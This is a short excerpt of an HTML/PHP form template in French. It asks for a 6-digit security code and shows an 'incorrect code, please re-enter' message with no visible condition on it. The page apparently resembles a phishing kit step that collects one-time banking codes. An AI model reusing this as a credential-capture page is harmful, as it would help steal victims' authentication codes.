            ...
            <div class="details-container">
                ...
                <form method="post" action="submit.php">
                    <div class="form-group">
						...
						<p style="font-weight: 600; color: #ff1100; font-size: 12px;">Votre code est incorrect, veuillez le ressaisir à nouveau.</p>
                        <input style="max-width: 300px;" maxlength="6" type="text" name="securepass1" id="securepass" placeholder="(6 chiffres )" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'securepass1') ?>">
                    ...
                    <input type="hidden" name="type" value="securepass1">
